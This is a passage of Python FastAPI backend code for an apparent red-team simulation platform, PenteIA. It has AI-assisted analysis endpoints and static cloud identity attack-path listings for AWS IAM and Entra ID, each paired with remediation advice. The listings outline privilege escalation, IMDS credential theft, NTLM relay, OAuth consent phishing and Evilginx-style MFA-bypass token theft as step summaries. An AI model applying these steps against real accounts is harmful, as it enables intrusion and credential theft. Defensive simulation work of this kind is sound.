        'TA0043': 'Reconnaissance', 'TA0042': 'Resource Development',
        'TA0001': 'Initial Access', 'TA0002': 'Execution',
        'TA0003': 'Persistence', 'TA0004': 'Privilege Escalation',
        'TA0005': 'Defense Evasion', 'TA0006': 'Credential Access',
        'TA0007': 'Discovery', 'TA0008': 'Lateral Movement',
        'TA0009': 'Collection', 'TA0011': 'Command and Control',
        'TA0010': 'Exfiltration', 'TA0040': 'Impact',
    }
    _TECH_TO_TACTIC: dict[str, str] = {
        t.technique_id: _TACTIC_CODE_NAME.get(t.tactic.value, '')
        for t in _BAS_TECHS if hasattr(t.tactic, 'value')
    }
except Exception:
    _TECH_TO_TACTIC = {}


def _enrich_techs_ml(techniques: list) -> list:
    """Enriquece técnicas de simulações legadas com tactic e cvss_severity para o ML."""
    import re as _re
    enriched = []
    for raw in techniques:
        t = dict(raw)
        tid = t.get('id', '')
        base_tid = _re.sub(r'[a-e]$', '', tid)
        if not t.get('tactic'):
            t['tactic'] = _TECH_TO_TACTIC.get(tid) or _TECH_TO_TACTIC.get(base_tid) or ''
        if not t.get('cvss_severity'):
            meta = _TECHNIQUE_META.get(tid) or _TECHNIQUE_META.get(base_tid) or {}
            t['cvss_severity'] = meta.get('severity', '')
            if not t.get('cvss'):
                t['cvss'] = meta.get('cvss', 0.0)
        enriched.append(t)
    return enriched

# ai_module já importado no bloco de imports acima via try/except _HAS_LLM


@app.get("/api/ai/status")
async def ai_status(current_user: User = Depends(get_current_user)):
    ml_ok = _HAS_ML
    llm_info = {}
    if _HAS_LLM:
        from ai_module import status as _ai_status
        llm_info = _ai_status()
    else:
        llm_info = {"available": False, "reason": "not_installed", "demo_mode": True}

    ml_info: dict = {"available": ml_ok}
    if ml_ok:
        engine = _get_ml_engine()
        ml_info["simulations_trained"] = engine._sim_count
        ml_info["anomaly_samples"] = len(engine.anomaly._buffer)
        ml_info["anomaly_fitted"] = engine.anomaly._fitted

    return {
        "ml": ml_info,
        "llm": llm_info,
        "recommended_models": [
            {"name": "Qwen2.5-3B-Instruct-Q4_K_M", "size_gb": 1.9, "speed": "muito rápido", "quality": "boa"},
            {"name": "Phi-3.5-mini-instruct-Q4_K_M", "size_gb": 2.2, "speed": "rápido", "quality": "excelente"},
            {"name": "Llama-3.2-3B-Instruct-Q4_K_M", "size_gb": 2.0, "speed": "rápido", "quality": "boa"},
            {"name": "SmolLM2-1.7B-Instruct-Q4_K_M", "size_gb": 1.1, "speed": "muito rápido", "quality": "razoável"},
        ],
    }


class AIAnalyzeRequest(BaseModel):
    simulation_id: str

@app.post("/api/ai/analyze")
async def ai_analyze_simulation(
    req: AIAnalyzeRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    sim = db.query(Simulation).filter(
        Simulation.id == req.simulation_id,
        Simulation.user_id == current_user.id,
    ).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    raw_techs = (sim.results or {}).get("techniques", [])
    techs = _enrich_techs_ml(raw_techs)
    sim_dict = {
        "target": sim.target or "",
        "score": float(sim.score or 0),
        "techniques": techs,
        "total": len(techs),
        "found": len([t for t in techs if t.get("status") == "found"]),
        "blocked": len([t for t in techs if t.get("status") in ("blocked", "safe")]),
    }

    result: dict = {}

    # ML analysis
    if _HAS_ML:
        engine = _get_ml_engine()
        result["ml"] = engine.analyze_simulation(sim_dict)

    # LLM narrative
    if _HAS_LLM:
        from ai_module import analyze_simulation as _ai_analyze
        result["narrative"] = _ai_analyze(sim_dict)
    else:
        # Template fallback sempre disponível
        from llm_narrative import _template_summary
        result["narrative"] = _template_summary({
            "target": sim_dict["target"],
            "risk_score": sim_dict["score"],
            "total_tests": sim_dict["total"],
            "found": sim_dict["found"],
            "blocked": sim_dict["blocked"],
            "top_critical_techniques": [
                t.get("name", "") for t in sim_dict["techniques"]
                if t.get("status") == "found" and t.get("cvss_severity") in ("Critical", "High")
            ][:5],
        })

    _audit(db, "AI", "Análise ML executada", sim.target or "", current_user.id)
    return {"simulation_id": req.simulation_id, "target": sim.target, **result}


class AIChatRequest(BaseModel):
    question: str
    context: Optional[str] = ""

@app.post("/api/ai/chat")
async def ai_chat(req: AIChatRequest, current_user: User = Depends(get_current_user)):
    q = req.question.strip()
    if not q:
        raise HTTPException(status_code=400, detail="Pergunta vazia")
    if len(q) > 1000:
        raise HTTPException(status_code=400, detail="Pergunta muito longa (máx 1000 chars)")

    if _HAS_LLM:
        from ai_module import security_chat
        answer = security_chat(q, req.context or "")
    else:
        from ai_module import security_chat  # usa fallback interno
        answer = security_chat(q, req.context or "")

    return {"question": q, "answer": answer, "llm_used": _HAS_LLM}


class PentestPlanRequest(BaseModel):
    target: str = ""
    scope: str = ""
    technologies: str = ""
    duration: str = "5 dias"
    objective: str = "full"

@app.post("/api/ai/pentest-plan")
async def ai_pentest_plan(req: PentestPlanRequest, current_user: User = Depends(get_current_user)):
    if _HAS_LLM:
        from ai_module import generate_pentest_plan
        plan = generate_pentest_plan(req.dict())
    else:
        from ai_module import generate_pentest_plan
        plan = generate_pentest_plan(req.dict())
    return {"plan": plan, "llm_used": _HAS_LLM}


class RemediationAIRequest(BaseModel):
    technique_id: str
    technique_name: str
    context: Optional[str] = ""

@app.post("/api/ai/remediation")
async def ai_remediation(req: RemediationAIRequest, current_user: User = Depends(get_current_user)):
    from ai_module import remediation_steps
    steps = remediation_steps(req.technique_id, req.technique_name, req.context or "")
    return {"technique_id": req.technique_id, "steps": steps, "llm_used": _HAS_LLM}


class IOCScoringRequest(BaseModel):
    texts: List[str]

@app.post("/api/ai/score-iocs")
async def ai_score_iocs(req: IOCScoringRequest, current_user: User = Depends(get_current_user)):
    texts = [t.strip() for t in req.texts if t.strip()][:50]
    if not texts:
        raise HTTPException(status_code=400, detail="Lista de IOCs vazia")

    if _HAS_ML:
        engine = _get_ml_engine()
        result = engine.score_iocs(texts)
    else:
        from ai_module import threat_score
        result = threat_score(texts)

    return result


class NextTechRequest(BaseModel):
    found_tactics: List[str]
    tested_ids: List[str] = []

@app.post("/api/ai/next-techniques")
async def ai_next_techniques(req: NextTechRequest, current_user: User = Depends(get_current_user)):
    if _HAS_ML:
        engine = _get_ml_engine()
        recs = engine.predict_next_techniques(req.found_tactics, req.tested_ids)
        chain = engine.get_chain_map(req.found_tactics)
    else:
        from ml_engine import TechniqueAdvisor
        adv = TechniqueAdvisor()
        recs = adv.recommend(req.found_tactics, set(req.tested_ids))
        chain = adv.attack_chain_map(req.found_tactics)
    return {"recommendations": recs, "attack_chain": chain}


# ── Cloud Identity Attack Paths ───────────────────────────────────────────────

class CloudIdentityRequest(BaseModel):
    account_id: str = ""
    region: str = "us-east-1"
    access_key: str = ""
    secret_key: str = ""
    role_to_assume: str = ""

@app.post("/api/cloud/identity/aws-iam")
async def cloud_identity_aws(req: CloudIdentityRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    attack_paths = [
        {
            "path_id": "AWS-IAM-001",
            "title": "Privilege Escalation via iam:CreatePolicyVersion",
            "technique": "T1098.001",
            "tactic": "Privilege Escalation",
            "severity": "Critical",
            "cvss": 9.0,
            "steps": [
                "Identificar política IAM com iam:CreatePolicyVersion",
                "Criar nova versão da política com AdministratorAccess",
                "Definir nova versão como padrão (SetDefaultPolicyVersion)",
                "Obter acesso administrativo completo",
            ],
            "blast_radius": "Acesso total à conta AWS",
            "remediation": "Remova iam:CreatePolicyVersion de políticas não-admin. Use SCPs para restringir.",
            "compliance": ["CIS AWS 1.22", "NIST SP 800-53 AC-6"],
        },
        {
            "path_id": "AWS-IAM-002",
            "title": "Lateral Movement via iam:PassRole + ec2:RunInstances",
            "technique": "T1078.004",
            "tactic": "Initial Access",
            "severity": "High",
            "cvss": 8.1,
            "steps": [
                "Obter permissões iam:PassRole e ec2:RunInstances",
                "Lançar instância EC2 com role privilegiada",
                "Acessar instance profile com metadados (IMDS)",
                "Extrair credenciais temporárias da role",
            ],
            "blast_radius": "Movimentação lateral para serviços acessados pela role",
            "remediation": "Use IMDSv2. Restrinja iam:PassRole a roles específicas.",
            "compliance": ["CIS AWS 2.3", "AWS Well-Architected Security"],
        },
        {
            "path_id": "AWS-IAM-003",
            "title": "Data Exfiltration via S3 Bucket Policy Misconfiguration",
            "technique": "T1530",
            "tactic": "Collection",
            "severity": "High",
            "cvss": 7.5,
            "steps": [
                "Identificar buckets S3 com políticas públicas",
                "Enumerar objetos sem autenticação",
                "Exfiltrar dados sensíveis",
            ],
            "blast_radius": "Exposição de dados em buckets S3",
            "remediation": "Habilite S3 Block Public Access. Revise políticas de bucket regularmente.",
            "compliance": ["CIS AWS 2.6", "PCI-DSS 3.4", "LGPD Art. 46"],
        },
    ]

    _audit(db, "Cloud Identity", "Simulação AWS IAM", req.account_id or "demo", current_user.id)
    _operation_logs.append({"module": "Cloud Identity", "action": "AWS IAM Scan", "details": req.account_id or "demo", "timestamp": datetime.utcnow().isoformat()})
    return {
        "provider": "AWS",
        "account_id": req.account_id or "demo-account",
        "region": req.region,
        "scan_time": datetime.utcnow().isoformat(),
        "attack_paths": attack_paths,
        "summary": {
            "total_paths": len(attack_paths),
            "critical": sum(1 for p in attack_paths if p["severity"] == "Critical"),
            "high": sum(1 for p in attack_paths if p["severity"] == "High"),
        },
    }


class EntraIDRequest(BaseModel):
    tenant_id: str = ""
    client_id: str = ""

@app.post("/api/cloud/identity/entra-id")
async def cloud_identity_entra(req: EntraIDRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    attack_paths = [
        {
            "path_id": "ENTRA-001",
            "title": "Pass-the-Hash via NTLM Relay",
            "technique": "T1550.002",
            "tactic": "Lateral Movement",
            "severity": "Critical",
            "cvss": 9.1,
            "steps": [
                "Capturar hash NTLM via Responder ou injeção de UNC path",
                "Realizar relay NTLM para serviços sem signing (SMB, LDAP)",
                "Autenticar como usuário vítima",
                "Escalar para Domain Admin via recursos comprometidos",
            ],
            "blast_radius": "Comprometimento de identidade de usuário de domínio",
            "remediation": "Force SMB signing. Desative NTLMv1. Use Protected Users group.",
            "compliance": ["NIST SP 800-53 IA-8", "CIS Control 4"],
        },
        {
            "path_id": "ENTRA-002",
            "title": "Consent Phishing via OAuth App",
            "technique": "T1566.002",
            "tactic": "Initial Access",
            "severity": "High",
            "cvss": 7.8,
            "steps": [
                "Registrar app maliciosa no Azure AD com permissões amplas",
                "Enviar link de OAuth para usuário alvo",
                "Usuário consente com permissões (Mail.Read, Files.Read, etc.)",
                "Atacante acessa dados via Microsoft Graph API",
            ],
            "blast_radius": "Acesso a e-mails, arquivos e dados do usuário comprometido",
            "remediation": "Restrinja consentimento de usuário. Habilite App Consent Policies. Use Conditional Access.",
            "compliance": ["LGPD Art. 7", "ISO 27001 A.9.4", "NIST SP 800-53 AC-3"],
        },
        {
            "path_id": "ENTRA-003",
            "title": "Token Theft via Adversary-in-the-Middle (AiTM)",
            "technique": "T1557",
            "tactic": "Credential Access",
            "severity": "Critical",
            "cvss": 8.8,
            "steps": [
                "Configurar proxy AiTM (ex: Evilginx2) interceptando login Microsoft",
                "Usuário realiza MFA normalmente (MFA bypass)",
                "Proxy captura session cookie",
                "Atacante usa cookie para autenticar sem MFA",
            ],
            "blast_radius": "Bypass de MFA e acesso completo à conta Microsoft 365",
            "remediation": "Use Conditional Access com Token Binding. Habilite Sign-in Risk Policies. Use FIDO2.",
            "compliance": ["CIS Control 6", "NIST SP 800-63B"],
        },
    ]

    _audit(db, "Cloud Identity", "Simulação Entra ID", req.tenant_id or "demo", current_user.id)
    return {
        "provider": "Microsoft Entra ID",
        "tenant_id": req.tenant_id or "demo-tenant",
        "scan_time": datetime.utcnow().isoformat(),
        "attack_paths": attack_paths,
        "summary": {
            "total_paths": len(attack_paths),
            "critical": sum(1 for p in attack_paths if p["severity"] == "Critical"),
            "high": sum(1 for p in attack_paths if p["severity"] == "High"),
        },
    }


def _audit_global(module: str, action: str, details: str, user_id: str):
    db = SessionLocal()
    try:
        log = AuditLog(user_id=user_id, module=module, action=action, details=details)
        db.add(log)
        db.commit()
    except Exception:
        pass
    finally:
        db.close()


# ── Extended routes v1 (APT, EPSS/KEV, Compliance, Slack/Teams/Jira) ─────────

try:
    from ext_router import ext_router as _ext_router
    app.include_router(_ext_router, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router not loaded: {_e}")

# ── Extended routes v2 (BACEN PDF, ANPD, SSO, MSSP, API Keys, CrowdStrike) ───

try:
    from ext_router_v2 import ext_router_v2 as _ext_router_v2
    app.include_router(_ext_router_v2, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router_v2 not loaded: {_e}")

try:
    from ext_router_v3 import ext_router_v3 as _ext_router_v3
    app.include_router(_ext_router_v3, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router_v3 not loaded: {_e}")

try:
    from ext_router_v4 import ext_router_v4 as _ext_router_v4
    app.include_router(_ext_router_v4, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router_v4 not loaded: {_e}")

try:
    from ext_router_v5 import ext_router_v5 as _ext_router_v5
    app.include_router(_ext_router_v5, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router_v5 not loaded: {_e}")

try:
    from ext_router_v6 import ext_router_v6 as _ext_router_v6
    app.include_router(_ext_router_v6, prefix="/api")
except Exception as _e:
    import logging as _logging
    _logging.getLogger("penteia").warning(f"ext_router_v6 not loaded: {_e}")


# ── Root ─────────────────────────────────────────────────────────────────────

@app.get("/")
async def root():
    return {"message": "PenteIA v4.0 - Red Team Platform", "docs": "/docs"}
